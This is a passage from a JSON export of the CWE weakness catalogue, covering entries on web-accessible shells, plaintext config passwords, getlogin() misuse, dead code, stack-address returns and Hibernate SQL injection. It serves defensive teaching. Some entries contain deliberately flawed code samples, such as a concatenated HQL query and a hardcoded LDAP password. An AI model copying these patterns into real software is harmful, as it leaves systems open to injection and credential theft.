          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-1835",
          "Description": "Data file under web root.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1835"
        }
      ],
      "AffectedResources": [
        "File or Directory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A10",
          "EntryName": "Insecure Configuration Management",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO15-C",
          "EntryName": "Ensure that file operations are performed in a secure directory"
        }
      ],
      "RelatedAttackPatterns": [
        "150",
        "639"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1307",
          "Section": "Section 3.7",
          "Authors": [
            "Center for Internet Security"
          ],
          "Title": "CIS Microsoft Azure Foundations Benchmark version 1.5.0",
          "PublicationYear": "2022",
          "PublicationMonth": "08",
          "PublicationDay": "16",
          "URL": "https://www.cisecurity.org/benchmark/azure",
          "URLDate": "2023-01-19"
        },
        {
          "ExternalReferenceID": "REF-1327",
          "Section": "Section 5.1",
          "Authors": [
            "Center for Internet Security"
          ],
          "Title": "CIS Google Cloud Computing Platform Benchmark version 1.3.0",
          "PublicationYear": "2022",
          "PublicationMonth": "03",
          "PublicationDay": "31",
          "URL": "https://www.cisecurity.org/benchmark/google_cloud_computing_platform",
          "URLDate": "2023-04-24"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "553",
      "Name": "Command Shell in Externally Accessible Directory",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "552",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Installation",
            "System Configuration"
          ],
          "Description": "Remove any Shells accessible under the web root folder and children directories."
        }
      ],
      "RelatedAttackPatterns": [
        "650"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "554",
      "Name": "ASP.NET Misconfiguration: Not Using Input Validation Framework",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The ASP.NET application does not use an input validation framework.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1173",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "ASP.NET",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ],
          "Note": "Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nUse the ASP.NET validation framework to check all program input before it is processed by the application. Example uses of the validation framework include checking to ensure that:\n\n\n  - Phone number fields contain only valid characters in phone numbers\n\n  - Boolean values are only \"T\" or \"F\"\n\n  - Free-form strings are of a reasonable length and composition\n\n"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "555",
      "Name": "J2EE Misconfiguration: Plaintext Password in Configuration File",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The J2EE application stores a plaintext password in a configuration file.",
      "ExtendedDescription": "Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resource, making it an easy target for attackers.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "260",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not hardwire passwords into your software."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use industry standard libraries to encrypt passwords before storage in configuration files."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Below is a snippet from a Java properties file in which the LDAP server password is stored in plaintext."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\twebapp.ldap.username=secretUsername\n\twebapp.ldap.password=secretPassword\n```"
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "556",
      "Name": "ASP.NET Misconfiguration: Use of Identity Impersonation",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.",
      "ExtendedDescription": "The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "266",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use the least privilege principle."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "558",
      "Name": "Use of getlogin() in Multithreaded Application",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.",
      "ExtendedDescription": "The getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. The function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. This makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "663",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Access Control",
            "Other"
          ],
          "Impact": [
            "Modify Application Data",
            "Bypass Protection Mechanism",
            "Other"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Using names for security purposes is not advised. Names are easy to forge and can have overlapping user IDs, potentially causing confusion or impersonation."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use getlogin_r() instead, which is reentrant, meaning that other processes are locked out from changing the username."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-172",
          "Entries": [
            {
              "IntroText": "The following code relies on getlogin() to determine whether or not a user is trusted. It is easily subverted."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tpwd = getpwnam(getlogin());\n\tif (isTrustedGroup(pwd->pw_gid)) {\n\t\tallow();\n\t} else {\n\t\tdeny();\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Often Misused: Authentication"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "560",
      "Name": "Use of umask() with chmod-style Argument",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "687",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Access Control"
          ],
          "Impact": [
            "Read Files or Directories",
            "Modify Files or Directories",
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use umask() with the correct argument."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "If you suspect misuse of umask(), you can use grep to spot call instances of umask()."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "Some umask() manual pages begin with the false statement: \"umask sets the umask to mask & 0777\" Although this behavior would better align with the usage of chmod(), where the user provided argument specifies the bits to enable on the specified file, the behavior of umask() is in fact opposite: umask() sets the umask to ~mask & 0777. The documentation goes on to describe the correct usage of umask(): \"The umask is used by open() to set initial file permissions on a newly-created file. Specifically, permissions in the umask are turned off from the mode argument to open(2) (so, for example, the common umask default value of 022 results in new files being created with permissions 0666 & ~022 = 0644 = rw-r--r-- in the usual case where the mode is specified as 0666).\""
        }
      ]
    },
    {
      "ID": "561",
      "Name": "Dead Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains dead code, which can never be executed.",
      "ExtendedDescription": "Dead code is code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1164",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ],
          "Note": "Dead code that results from code that can never be executed is an indication of problems with the source code that needs to be fixed and is an indication of poor quality."
        },
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAttack Modeling",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBinary / Bytecode Quality Analysis\n\t\tCompare binary / bytecode to application permission manifest",
          "Effectiveness": "High"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAutomated Monitored Execution",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tPermission Manifest Analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource Code Quality Analyzer\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWarning Flags\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Dynamic Analysis with Automated Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Remove dead code before deploying the application."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a static analysis tool to spot dead code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-217",
          "Entries": [
            {
              "IntroText": "The condition for the second if statement is impossible to satisfy. It requires that the variables be non-null. However, on the only path where s can be assigned a non-null value, there is a return statement."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tString s = null;\n\tif (b) {\n\t\ts = \"Yes\";\n\t\treturn;\n\t}\n\tif (s != null) {\n\t\tDead();\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class DoubleDead {\n\t\tprivate void doTweedledee() {\n\t\t\tdoTweedledumb();\n\t\t}\n\t\tprivate void doTweedledumb() {\n\t\t\tdoTweedledee();\n\t\t}\n\t\tpublic static void main(String[] args) {\n\t\t\tSystem.out.println(\"running DoubleDead\");\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The field named glue is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Dead {\n\t\t\tString glue;\n\t\t\tpublic String getGlue() {\n\t\t\t\treturn \"glue\";\n\t\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2014-1266",
          "Description": "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC07-C",
          "EntryName": "Detect and remove dead code"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "MSC00-PL",
          "EntryName": "Detect and remove dead code",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP2",
          "EntryName": "Unused Entities"
        },
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-20"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-20",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "562",
      "Name": "Return of Stack Variable Address",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.",
      "ExtendedDescription": "Because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. A subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. At best this will cause the value of the pointer to change unexpectedly. In many cases it causes the program to crash the next time the pointer is dereferenced.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "672",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "825",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory",
            "Execute Unauthorized Code or Commands",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "If the returned stack buffer address is dereferenced after the return, then an attacker may be able to modify or read memory, depending on how the address is used. If the address is used for reading, then the address itself may be exposed, or the contents that the address points to. If the address is used for writing, this can lead to a crash and possibly code execution."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use static analysis tools to spot return of the address of a stack variable."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-203",
          "Entries": [
            {
              "IntroText": "The following function returns a stack address."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* getName() {\n\t\tchar name[STR_MAX];\n\t\tfillInName(name);\n\t\treturn name;\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "DCL30-C",
          "EntryName": "Declare objects with appropriate storage durations",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "POS34-C",
          "EntryName": "Do not call putenv() with a pointer to an automatic variable as the argument"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "563",
      "Name": "Assignment to Variable without Use",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The variable's value is assigned but never used, making it a dead store.",
      "ExtendedDescription": "After the assignment, the variable is either assigned another value or goes out of scope. It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1164",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Unused Variable"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ],
          "Note": "This weakness could be an indication of a bug in the program or a deprecated variable that was not removed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Remove unused variables from the code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-218",
          "Entries": [
            {
              "IntroText": "The following code excerpt assigns to the variable r and then overwrites the value without using it."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tr = getName();\n\tr = getNewBuffer(buf);\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MSC00-C",
          "EntryName": "Compile cleanly at high warning levels"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "MSC01-PL",
          "EntryName": "Detect and remove unused variables",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP2",
          "EntryName": "Unused Entities"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "564",
      "Name": "SQL Injection: Hibernate",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "89",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "89",
          "ViewID": "928",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "89",
          "ViewID": "1305",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data",
            "Modify Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "A non-SQL style database which is not subject to this flaw may be chosen."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Follow the principle of least privilege when creating user accounts to a SQL database. Users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data."
        },
        {
          "MitigationID": "MIT-15",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Implement SQL strings using prepared statements that bind variables. Prepared statements that do not bind variables can be vulnerable to attack."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use vigorous allowlist style checking on any user input that may be used in a SQL command. Rather than escape meta-characters, it is safest to disallow them entirely. Reason: Later use of data that have been entered in the database may neglect to escape meta-characters before use. Narrowly define the set of safe characters based on the expected value of the parameter in the request."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code excerpt uses Hibernate's HQL syntax to build a dynamic query that's vulnerable to SQL injection."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString street = getStreetFromUser();\n\tQuery query = session.createQuery(\"from Address a where a.street='\" + street + \"'\");\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "RelatedAttackPatterns": [
        "109"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "565",
      "Name": "Reliance on Cookies without Validation and Integrity Checking",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.",
      "ExtendedDescription": "Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "642",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "669",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "602",
          "ViewID": "1000"
        }
      ],
